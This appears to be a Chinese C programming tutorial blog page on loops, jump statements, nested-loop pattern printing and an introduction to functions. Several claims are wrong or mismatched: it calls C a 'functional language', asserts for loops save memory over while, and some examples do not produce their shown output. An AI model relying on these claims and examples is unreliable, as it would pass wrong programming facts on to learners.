<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// 1.判断循环控制条件是否为真,此时为假所以跳过循环语句</span></span><br><span class="line">    <span class="keyword">while</span> (count &lt; <span class="number">3</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔\n&quot;</span>); </span><br><span class="line">        count++; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.执行循环语句后面的代码, 打印&quot;循环执行完毕&quot;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;循环执行完毕\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 1.判断循环控制条件是否为真,此时0 &lt; 3为真</span></span><br><span class="line">    <span class="comment">// 4.再次判断循环控制条件是否为真,此时1 &lt; 3为真</span></span><br><span class="line">    <span class="comment">// 7.再次判断循环控制条件是否为真,此时2 &lt; 3为真</span></span><br><span class="line">    <span class="comment">// 10.再次判断循环控制条件是否为真,此时3 &lt; 3为假, 跳过循环语句</span></span><br><span class="line">    <span class="keyword">while</span> (count &lt; <span class="number">3</span>) &#123; </span><br><span class="line">        <span class="comment">// 2.执行循环体中的代码, 打印&quot;发子弹&quot;</span></span><br><span class="line">        <span class="comment">// 5.执行循环体中的代码, 打印&quot;发子弹&quot;</span></span><br><span class="line">        <span class="comment">// 8.执行循环体中的代码, 打印&quot;发子弹&quot;</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔\n&quot;</span>); </span><br><span class="line">        <span class="comment">// 3.执行&quot;能够让循环结束的语句&quot; count = 1</span></span><br><span class="line">        <span class="comment">// 6.执行&quot;能够让循环结束的语句&quot; count = 2</span></span><br><span class="line">        <span class="comment">// 9.执行&quot;能够让循环结束的语句&quot; count = 3</span></span><br><span class="line">        count++; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 11.执行循环语句后面的代码, 打印&quot;循环执行完毕&quot;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;循环执行完毕\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>while循环注意点</strong><ul>
<li>任何数值都有真假性</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// 死循环</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔\n&quot;</span>);</span><br><span class="line">         <span class="comment">// 没有能够让循环结束的语句</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>当while后面只有一条语句时,while后面的大括号可以省略</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)  <span class="comment">// 死循环</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔\n&quot;</span>);</span><br><span class="line">         <span class="comment">// 没有能够让循环结束的语句</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>如果while省略了大括号, 那么后面不能定义变量</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)  <span class="comment">// 死循环</span></span><br><span class="line">         <span class="keyword">int</span> num = <span class="number">10</span>; <span class="comment">// 报错</span></span><br><span class="line">         <span class="comment">// 没有能够让循环结束的语句</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>C语言中分号(;)也是一条语句, 称之为空语句</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (count &lt; <span class="number">3</span>);&#123; <span class="comment">// 死循环</span></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔\n&quot;</span>); </span><br><span class="line">       count++; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>最简单的死循环</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 死循环一般在操作系统级别的应用程序会比较多, 日常开发中很少用</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>while练习<ul>
<li>计算1 + 2 + 3 + …n的和</li>
<li>获取1～100之间 7的倍数的个数</li>
</ul>
</li>
</ul>
<h2 id="循环结构do-while"><a href="#循环结构do-while" class="headerlink" title="循环结构do while"></a>循环结构do while</h2><ul>
<li>格式:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    循环体中的语句;</span><br><span class="line">    能够让循环结束的语句;</span><br><span class="line">    ....</span><br><span class="line">&#125; <span class="keyword">while</span> (循环控制条件 );</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>示例</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔\n&quot;</span>);</span><br><span class="line">   count++;</span><br><span class="line">&#125;<span class="keyword">while</span>(count &lt; <span class="number">10</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>do-while循环执行流程<ul>
<li>首先不管while中的条件是否成立, 都会执行一次”循环体”</li>
<li>执行完一次循环体,接着再次判断while中的条件是否为真, 为真继续执行循环体,为假跳出循环</li>
<li>重复以上操作, 直到”循环控制条件”为假为止</li>
</ul>
</li>
<li>应用场景<ul>
<li>口令校验</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入密码,验证您的身份\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="number">123456</span> != num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;主人,您终于回来了\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>while和dowhile应用场景<ul>
<li>绝大多数情况下while和dowhile可以互换, 所以能用while就用while</li>
<li>无论如何都需要先执行一次循环体的情况, 才使用dowhile</li>
<li>do while 曾一度提议废除，但是他在输入性检查方面还是有点用的</li>
</ul>
</li>
</ul>
<h2 id="循环结构for"><a href="#循环结构for" class="headerlink" title="循环结构for"></a>循环结构for</h2><ul>
<li>格式:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(初始化表达式；循环条件表达式；循环后的操作表达式) &#123;</span><br><span class="line">    循环体中的语句;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">    printf(&quot;发射子弹~哔哔哔哔\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>for循环执行流程<ul>
<li>首先执行”初始化表达式”，而且在整个循环过程中,<em><strong>只会执行一次</strong></em>初始化表达式</li>
<li>接着判断”循环条件表达式”是否为真，为真执行循环体中的语句</li>
<li>循环体执行完毕后，接下来会执行”循环后的操作表达式”，然后再次判断条件是否为真,为真继续执行循环体,为假跳出循环</li>
<li>重复上述过程，直到条件不成立就结束for循环</li>
</ul>
</li>
<li>for循环注意点:<ul>
<li>和while一模一样</li>
<li>最简单的死循环<code>for(;;);</code></li>
</ul>
</li>
<li>for和while应用场景<ul>
<li>while能做的for都能做, 所以企业开发中能用for就用for, 因为for更为灵活</li>
<li>而且对比while来说for更节约内存空间</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>; <span class="comment">// 初始化表达式</span></span><br><span class="line"><span class="keyword">while</span> (count &lt; <span class="number">10</span>) &#123; <span class="comment">// 条件表达式</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔 %i\n&quot;</span>, count);</span><br><span class="line">      count++; <span class="comment">// 循环后增量表达式</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果初始化表达式的值, 需要在循环之后使用, 那么就用while</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;count = %i\n&quot;</span>, count);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注意: 在for循环初始化表达式中定义的变量, 只能在for循环后面的&#123;&#125;中访问</span></span><br><span class="line"><span class="comment">// 所以: 如果初始化表达式的值, 不需要在循环之后使用, 那么就用for</span></span><br><span class="line"><span class="comment">// 因为如果初始化表达式的值, 在循环之后就不需要使用了 , 那么用while会导致性能问题</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> count = <span class="number">0</span>; count &lt; <span class="number">10</span>; count++) &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔 %i\n&quot;</span>, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//     printf(&quot;count = %i\n&quot;, count);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果需要使用初始化表达式的值, 也可以将初始化表达式写到外面</span></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; count &lt; <span class="number">10</span>; count++) &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔\n&quot;</span>, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;count = %i\n&quot;</span>, count);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="四大跳转"><a href="#四大跳转" class="headerlink" title="四大跳转"></a>四大跳转</h2><ul>
<li>C语言中提供了四大跳转语句, 分别是return、break、continue、goto</li>
<li>break:<ul>
<li>立即跳出switch语句或循环</li>
</ul>
</li>
<li>应用场景:<ul>
<li>switch</li>
<li>循环结构<br><img src="/2022/01/15/C/912852ed05d5b35f881533a2187ed9f6.png" alt="img"><br><img src="/2022/01/15/C/3d827d07e49b3a8714cb36dcb7d1ee68.png" alt="img"></li>
</ul>
</li>
<li>break注意点:<ul>
<li>break离开应用范围，存在是没有意义的</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">break</span>; <span class="comment">// 会报错</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>在多层循环中,一个break语句只向外跳一层</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span>;<span class="comment">// 只对while2有效, 不会影响while1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;while1循环体\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>break下面不可以有语句，因为执行不到</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">2</span>)&#123;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;打我啊!&quot;</span>);<span class="comment">// 执行不到</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>continue<ul>
<li>结束<em><strong>本轮</strong></em>循环，进入<em><strong>下一轮</strong></em>循环</li>
</ul>
</li>
<li>应用场景:<ul>
<li>循环结构<br><img src="https://img-blog.csdnimg.cn/img_convert/583422ddce6be561ca9c76019f629c19.png" alt="img"></li>
</ul>
</li>
<li>continue注意点:<ul>
<li>continue离开应用范围，存在是没有意义的</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">continue</span>; <span class="comment">// 会报错</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>goto</p>
<ul>
<li>这是一个不太值得探讨的话题，goto 会破坏结构化程序设计流程，它将使程序层次不清，且不易读，所以慎用</li>
<li>goto 语句，仅能在本函数内实现跳转，不能实现跨函数跳转(短跳转)。但是他在跳出多重循环的时候效率还是蛮高的<br><img src="/2022/01/15/C/c6c568069c9f5d7e162f250f7ea9e4fc.png" alt="img"></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// loop:是定义的标记</span></span><br><span class="line">loop:<span class="keyword">if</span>(num &lt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;num = %d\n&quot;</span>, num);</span><br><span class="line">        num++;</span><br><span class="line">        <span class="comment">// goto loop代表跳转到标记的位置</span></span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">goto</span> lnj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    lnj:<span class="built_in">printf</span>(<span class="string">&quot;跳过了所有循环&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>return<ul>
<li>结束当前函数，将结果返回给调用者</li>
<li>不着急, 放一放,学到函数我们再回头来看它</li>
</ul>
</li>
</ul>
<hr>
<h2 id="循环的嵌套"><a href="#循环的嵌套" class="headerlink" title="循环的嵌套"></a>循环的嵌套</h2><ul>
<li>循环结构的循环体中存在其他的循环结构，我们称之为循环嵌套<ul>
<li>注意: 一般循环嵌套不超过三层</li>
<li>外循环执行的次数 * 内循环执行的次数就是内循环总共执行的次数</li>
</ul>
</li>
<li>格式:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(条件表达式) &#123;</span><br><span class="line">    <span class="keyword">while</span>循环结构 <span class="keyword">or</span> dowhile循环结构 <span class="keyword">or</span> <span class="keyword">for</span>循环结构</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(初始化表达式；循环条件表达式；循环后的操作表达式) &#123;</span><br><span class="line">    <span class="keyword">while</span>循环结构 <span class="keyword">or</span> dowhile循环结构 <span class="keyword">or</span> <span class="keyword">for</span>循环结构</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">     <span class="keyword">while</span>循环结构 <span class="keyword">or</span> dowhile循环结构 <span class="keyword">or</span> <span class="keyword">for</span>循环结构</span><br><span class="line">&#125; <span class="keyword">while</span> (循环控制条件 );</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>循环优化<ul>
<li>在多重循环中，如果有可能，应当将最长的循环放在最内层，最短的循环放在最外层，以减少 CPU 跨切循环层的次数</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (row=<span class="number">0</span>; row&lt;<span class="number">100</span>; row++) &#123;</span><br><span class="line">  <span class="comment">// 低效率：长循环在最外层</span></span><br><span class="line">  <span class="keyword">for</span> ( col=<span class="number">0</span>; col&lt;<span class="number">5</span>; col++ ) &#123;</span><br><span class="line">    sum = sum + a[row][col];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (col=<span class="number">0</span>; col&lt;<span class="number">5</span>; col++ ) &#123;</span><br><span class="line">  <span class="comment">// 高效率：长循环在最内层</span></span><br><span class="line">  <span class="keyword">for</span> (row=<span class="number">0</span>; row&lt;<span class="number">100</span>; row++) &#123;</span><br><span class="line">    sum = sum + a[row][col];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>练习<ul>
<li>打印好友列表</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">好友列表<span class="number">1</span></span><br><span class="line">    好友<span class="number">1</span></span><br><span class="line">    好友<span class="number">2</span></span><br><span class="line">好友列表<span class="number">2</span></span><br><span class="line">    好友<span class="number">1</span></span><br><span class="line">    好友<span class="number">2</span></span><br><span class="line">好友列表<span class="number">3</span></span><br><span class="line">    好友<span class="number">1</span></span><br><span class="line">    好友<span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;好友列表%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    角色%d\n&quot;</span>, j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="图形打印"><a href="#图形打印" class="headerlink" title="图形打印"></a>图形打印</h2><ul>
<li>一重循环解决线性的问题，而二重循环和三重循环就可以解决平面和立体的问题了</li>
<li>打印矩形</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">****</span><br><span class="line">****</span><br><span class="line">****</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 3行4列</span></span><br><span class="line"><span class="comment">//  外循环控制行数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line"><span class="comment">//        内循环控制列数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>打印三角形<ul>
<li>尖尖朝上，改变内循环的条件表达式，让内循环的条件表达式随着外循环的i值变化</li>
<li>尖尖朝下，改变内循环的初始化表达式，让内循环的初始化表达式随着外循环的i值变化</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line">**</span><br><span class="line">***</span><br><span class="line">****</span><br><span class="line">*****</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">最多打印5行</span></span><br><span class="line"><span class="comment">最多打印5列</span></span><br><span class="line"><span class="comment">每一行和每一列关系是什么? 列数&lt;=行数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*****</span><br><span class="line">****</span><br><span class="line">***</span><br><span class="line">**</span><br><span class="line">*</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>练习<ul>
<li>打印特殊三角形</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, j+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>打印特殊三角形</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">333</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>打印特殊三角形</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--*</span><br><span class="line">-***</span><br><span class="line">*****</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span> - i; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; <span class="number">2</span>*i+<span class="number">1</span>; m++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>打印99乘法表</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> * <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">1</span> * <span class="number">2</span> = <span class="number">2</span>     <span class="number">2</span> * <span class="number">2</span> = <span class="number">4</span></span><br><span class="line"><span class="number">1</span> * <span class="number">3</span> = <span class="number">3</span>     <span class="number">2</span> * <span class="number">3</span> = <span class="number">6</span>     <span class="number">3</span> * <span class="number">3</span> = <span class="number">9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d * %d = %d \t&quot;</span>, j, i, (j * i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="函数基本概念"><a href="#函数基本概念" class="headerlink" title="函数基本概念"></a>函数基本概念</h2><ul>
<li>C源程序是由函数组成的<ul>
<li>例如: 我们前面学习的课程当中,通过main函数+scanf函数+printf函数+逻辑代码就可以组成一个C语言程序</li>
</ul>
</li>
<li>C语言不仅提供了极为丰富的库函数, 还允许用户建立自己定义的函数。用户可把自己的算法编写成一个个相对独立的函数，然后再需要的时候调用它<ul>
<li>例如:你用C语言编写了一个MP3播放器程序，那么它的程序结构如下图所示</li>
<li><img src="/2022/01/15/C/5ae3272e9f2f49988524b0e511a40287.png" alt="img"></li>
</ul>
</li>
<li>可以说C程序的全部工作都是由各式各样的函数完成的,所以也把C语言称为函数式语言</li>
</ul>
<hr>
<h2 id="函数的分类"><a href="#函数的分类" class="headerlink" title="函数的分类"></a>函数的分类</h2><ul>
<li>在C语言中可从不同的角度对函数分类</li>
<li>从函数定义的角度看,函数可分为库函数和用户定义函数两种<ul>
<li><em><strong>库函数:</strong></em> 由C语言系统提供,用户无须定义,也不必在程序中作类型说明,只需在程序前包含有该函数原型的头文件即可在程序中直接调用。在前面各章的例题中反复用到printf、scanf、getchar、putchar等函数均属此类</li>
